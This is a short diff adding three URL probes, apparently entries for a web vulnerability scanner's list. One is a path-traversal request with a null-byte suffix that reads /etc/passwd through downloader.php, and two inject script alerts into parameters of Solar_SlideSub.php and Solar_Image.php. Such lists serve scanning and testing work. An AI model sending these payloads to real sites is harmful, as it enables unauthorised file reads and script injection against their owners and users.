@@ -1,0 +1,3 @@
+/downloader.php?file=../../../../../../../../../../../../../etc/passwd%00.jpg
+/Solar_SlideSub.php?id=4&play=1&pow=sds%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3C%22&bgcolor=green
+/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
